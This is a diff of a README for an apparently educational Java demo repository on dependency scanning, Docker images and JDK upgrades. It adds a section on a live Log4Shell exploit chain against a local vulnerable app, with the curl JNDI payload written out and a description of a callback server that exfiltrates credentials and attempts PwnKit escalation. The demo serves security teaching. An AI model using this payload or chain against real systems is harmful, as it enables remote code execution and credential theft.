@@ -26,7 +26,9 @@ The presentation can be viewed via [GitHub Pages](https://johanjanssen.github.io
 | Directory | What it demonstrates | Quick Start |
 |---|---|---|
 | [Vulnerable Application/](#vulnerable-application) | Spring Boot app with **intentionally vulnerable** dependencies — the scan target | `./mvnw -f "Vulnerable Application/pom.xml" package` |
+| [Vulnerable Application Old Java/](#vulnerable-application-old-java--callback-server) & [Callback Server/](#vulnerable-application-old-java--callback-server) | Java 17 / Spring Boot 2.7 target for a live, end-to-end Log4Shell RCE + PwnKit escalation demo, caught by a local "attacker" server | `cd "Callback Server" && ../mvnw spring-boot:run` |
 | [Build Docker Images/](#build-docker-images) | 11 Docker image strategies (JRE, jlink, CRaC, GraalVM native) with size & startup benchmarks | `bash "Build Docker Images/build-all-images.sh"` |
+| [Performance Improvement/](#performance-improvement) | JMH benchmarks proving Java 17→25→28 EA (Valhalla) gives free speed & memory wins | `bash "Performance Improvement/scripts/run-benchmarks.sh"` |
 | [Grype/](#grype) | Image vulnerability scanning with Grype (Anchore) | `bash Grype/scripts/compare-images.sh` |
 | [Trivy/](#trivy) | Image vulnerability scanning with Trivy (Aqua Security) | `bash Trivy/scripts/compare-images.sh` |
 | [OWASP Dependency Check/](#owasp-dependency-check) | Maven dependency scanning against the NVD database | `bash "OWASP Dependency Check/scripts/run-check.sh"` |
@@ -35,7 +37,7 @@ The presentation can be viewed via [GitHub Pages](https://johanjanssen.github.io
 | [Old GroupIds Alerter/](#old-groupids-alerter) | Flags `pom.xml` dependencies declared under groupIds that moved (e.g. `javax.*` → `jakarta.*`) | `bash "Old GroupIds Alerter/scripts/run-oga.sh"` |
 | [Maven Dependency Plugin/](#maven-dependency-plugin) | Finds unused `pom.xml` dependencies with `dependency:analyze` — and the JDBC-driver false positive it gets wrong | `bash "Maven Dependency Plugin/scripts/run-dependency-analyze.sh"` |
 | [Testcontainers/](#testcontainers) | Integration testing with real PostgreSQL via `@ServiceConnection` | `bash Testcontainers/scripts/run-tests.sh` |
-| [JaCoCo/](#jacoco) | Production-agent code coverage — detect dead code in running applications | `bash "Jacoco/scripts/Retrieve Coverage From Port/run-demo.sh"` |
+| [JaCoCo/](#jacoco) | Production-agent code coverage — detect dead code in running applications | `bash "JaCoCo/scripts/Retrieve Coverage From Port/run-demo.sh"` |
 | [Renovate/](#renovate) | Local Gitea + Jenkins + Renovate bot — automated dependency update PRs | `bash Renovate/scripts/demo.sh` |
 
 ---
@@ -44,6 +46,29 @@ The presentation can be viewed via [GitHub Pages](https://johanjanssen.github.io
 
 **`images.conf`** at the project root is the single source of truth for all base
 and application image names. It is sourced by every scanning and measurement script.
+
+---
+
+## Published Reports (GitHub Pages)
+
+Every demo publishes its own results to
+[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date) on each push to `master`,
+under its own subfolder so no workflow's output overwrites another's:
+
+| Path | Demo |
+|---|---|
+| [`/Presentation/`](https://johanjanssen.github.io/Keep-Up-To-Date/Presentation/) | The reveal.js conference slide deck |
+| [`/vulnerable/`](https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/) | Vulnerable Application Old Java + Callback Server — full exploit chain demo |
+| [`/images/`](https://johanjanssen.github.io/Keep-Up-To-Date/images/) | Build Docker Images — size & startup performance comparison |
+| [`/Benchmarks/`](https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/) | Performance Improvement — Java 17 vs 25 vs 28 EA benchmarks |
+| [`/Scans/`](https://johanjanssen.github.io/Keep-Up-To-Date/Scans/) | Compare Security Scans — Trivy vs Grype vs OWASP DC |
+| [`/OWASP/`](https://johanjanssen.github.io/Keep-Up-To-Date/OWASP/) | OWASP Dependency Check |
+| [`/OpenRewrite/`](https://johanjanssen.github.io/Keep-Up-To-Date/OpenRewrite/) | OpenRewrite migration recipes |
+| [`/renamed/`](https://johanjanssen.github.io/Keep-Up-To-Date/renamed/) | Old GroupIds Alerter |
+| [`/dependency/`](https://johanjanssen.github.io/Keep-Up-To-Date/dependency/) | Maven Dependency Plugin |
+| [`/testcontainers/`](https://johanjanssen.github.io/Keep-Up-To-Date/testcontainers/) | Testcontainers |
+| [`/JaCoCo/`](https://johanjanssen.github.io/Keep-Up-To-Date/JaCoCo/) | JaCoCo coverage report |
+| [`/renovate/`](https://johanjanssen.github.io/Keep-Up-To-Date/renovate/) | Renovate — real PRs opened against the demo Gitea repo |
 
 ---
 
@@ -57,6 +82,40 @@ Spring Boot 4.1 / Java 25 web application with **intentionally vulnerable** depe
 | `jackson-databind` | `2.9.10` | CVE-2019-14379 + others | 9.8 |
 
 Used as the scan target for Grype, Trivy, OWASP DC, and the Docker image builds.
+
+---
+
+## Vulnerable Application Old Java & Callback Server
+
+A second, older target — Spring Boot **2.7** / Java **17**, `log4j-core 2.14.1` (pre-patch) —
+plus a local "attacker" server, used together for a live, **end-to-end exploit chain** rather
+than a static scan:
+
+1. A single `curl` against the vulnerable app's search endpoint triggers a Log4Shell JNDI lookup.
+2. The **Callback Server** (`Callback Server/`) answers on LDAP (port 1389) with a reference to a
+   malicious class, and serves it over HTTP (port 9999) — its static initializer runs on the
+   victim, performing recon and exfiltrating credentials/env vars back to the callback server, all
+   visible on its live dashboard.
+3. If the victim container is non-root (`Dockerfile.escalation`) and has `pkexec`/`gcc` available,
+   a second stage attempts privilege escalation via PwnKit (CVE-2021-4034) — honestly reported as
+   succeeding or failing depending on whether the target's `policykit-1` package is actually patched.
+
+```bash
+# Attacker server
+cd "Callback Server" && ../mvnw spring-boot:run
+
+# Victim app (root variant)
+docker build -f "Vulnerable Application Old Java/Dockerfile.root" -t vuln-app:root "Vulnerable Application Old Java"
+docker run -p 8080:8080 vuln-app:root
+
+# Fire the exploit
+curl "http://localhost:8080/api/products/search?q=\${jndi:ldap://localhost:1389/pwnkit}"
+```
+
+See [`Callback Server/README.md`](Callback%20Server/README.md) for the full attack chain, ports,
+and endpoints. A GitHub Actions workflow (`demo-vulnerable-app.yml`) runs this end-to-end on every
+push and publishes the transcript to
+[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/).
 
 ---
 
@@ -84,6 +143,26 @@ bash "Build Docker Images/measure-performance.sh"    # startup time + memory
 | `native-minimal-distroless-static-debian` | GraalVM native (minimal) | `distroless/static-debian13` |
 | `native-scratch` | GraalVM native | `scratch` |
 | `native-netty-scratch` | GraalVM native (Netty) | `scratch` |
+
+---
+
+## Performance Improvement
+
+JMH benchmarks run on **Java 17**, **Java 25**, and **Java 28 EA** (Project Valhalla preview) to
+show measurable, verified performance and memory improvements from upgrading the JDK alone —
+plus the one Valhalla language change that needs an actual code edit (`record` → `value record`).
+Results are only reported as a "win" when the current run's numbers back it up (≥3% better);
+flat or regressed comparisons are left out rather than rounded up.
+
+```bash
+bash "Performance Improvement/scripts/run-benchmarks.sh"                          # run all benchmarks
+python3 "Performance Improvement/scripts/generate-html-report.py" results/ results/html/index.html
+```
+
+Published on every run to
+[GitHub Pages](https://johanjanssen.github.io/Keep-Up-To-Date/Benchmarks/). See
+[`Performance Improvement/README.md`](Performance%20Improvement/README.md) for the full
+benchmark breakdown, the Valhalla flattening size-limit finding, and what was cut and why.
 
 ---
 
@@ -198,8 +277,8 @@ Production-agent code coverage with JaCoCo — detect dead code by attaching the
 to a running application. Two modes: TCP port-based (live dumps) and file-based (on JVM exit).
 
 ```bash
-bash "Jacoco/scripts/Retrieve Coverage From Port/run-demo.sh"   # port-based (fully automated)
-bash "Jacoco/scripts/Retrieve Coverage From File/run-demo.sh"   # file-based (fully automated)
+bash "JaCoCo/scripts/Retrieve Coverage From Port/run-demo.sh"   # port-based (fully automated)
+bash "JaCoCo/scripts/Retrieve Coverage From File/run-demo.sh"   # file-based (fully automated)
 ```
 
 ---
